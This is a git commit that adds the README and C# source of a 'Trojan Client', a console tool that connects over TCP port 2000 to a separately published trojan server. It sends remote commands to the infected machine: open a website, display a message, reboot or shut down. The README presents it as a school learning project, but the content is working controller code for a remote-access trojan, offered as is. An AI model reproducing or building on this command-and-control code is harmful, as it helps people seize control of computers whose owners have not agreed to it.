ad1893f3c742c5b3821eb8a3c6585ce85643f2c2
RobStyling <robin@rainbowlotus.de>
2016-10-08 16:52:43 +0200

    Initial Commit :smile: :space_invader:
    Initial Commit :smile: :space_invader:

---
+++ README.md
@@ -0,0 +1,9 @@
+Hello! This is a litte Project i wanted to make a Long time ago!
+
+This is the Trojan Client that can connect to the Trojan Server refrecend here: http://github.com/RobStyling/TroServer_Console
+
+I hope you like the Project!
+
+Disclaimer: 
+This Project is only for learning Reasons and also only created for that! 
+Its a Part of a School Project and not meant to do bad Stuff. 
---
+++ Trojan Client/Program.cs
@@ -0,0 +1,78 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Net.Sockets;
+using System.Threading.Tasks;
+
+namespace Trojan_Client
+{
+    class Program
+    {
+        public static bool IsConnected;
+        public static NetworkStream Writer;
+        static void Main(string[] args)
+        {
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Title = "Rob Trojan Client - Offline";
+            TcpClient Connector = new TcpClient();
+        GetConnection:
+            Console.WriteLine("Enter a Server IP:");
+            string IP = Console.ReadLine();
+            try
+            {
+                Connector.Connect(IP, 2000);
+                IsConnected = true;
+                Console.Title = "Rob Trojan Client - Online";
+                Writer = Connector.GetStream();
+            }
+            catch
+            {
+                Console.WriteLine("Error while connecting to the Target! Press any Key to try again!");
+                Console.ReadKey();
+                Console.Clear();
+                goto GetConnection;
+            }
+            Console.WriteLine("Connection successfully established to " + IP + ".");
+            Console.WriteLine("Type HELP for a list of commands.");
+            while (IsConnected)
+            {
+                Console.WriteLine("Enter command : ");
+                string CMD = Console.ReadLine();
+                if (CMD == "HELP")
+                {
+                    Console.WriteLine("COMMANDS");
+
+                    Console.WriteLine("OPENSITE!!!!---http://example.com");
+
+                    Console.WriteLine("MESSAGE!!!!---message here");
+
+                    Console.WriteLine("REBOOT!!!!---Time Here");
+
+                    Console.WriteLine("SHUTDOWN!!!!---Time Here");
+                }
+                else
+                {
+                    SendCommand(CMD);
+                }
+            }
+        }
+                
+            public static void SendCommand(string Command)
+            {
+                try
+                {
+                    byte[] Packet = Encoding.ASCII.GetBytes(Command);
+                    Writer.Write(Packet, 0, Packet.Length);
+                    Writer.Flush();
+                }
+                catch
+                {
+                IsConnected = false;
+                Console.WriteLine("Disconnected from Server!");
+                Console.ReadKey();
+                Writer.Close();
+                }
+
+            }
+        }
+    }
